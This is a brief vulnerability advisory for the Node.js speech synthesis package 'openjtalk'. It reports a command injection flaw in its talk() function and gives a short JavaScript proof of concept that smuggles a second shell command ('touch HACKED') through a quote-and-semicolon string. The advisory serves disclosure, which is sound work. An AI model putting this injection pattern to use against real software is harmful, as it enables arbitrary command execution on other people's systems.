# Overview

`openjtalk` is a free japanese speech synthesis tool in Nodejs.
Affected versions of this package are vulnerable to Command Injection. It is possible to inject arbitrary commands by using a semicolon char in any of the key values, using the `talk()` fucntion.

# Proof of Concept

```js
var OpenJTalk = require('openjtalk');
var mei = new OpenJTalk();
mei.talk(' "; touch HACKED; #//');
```
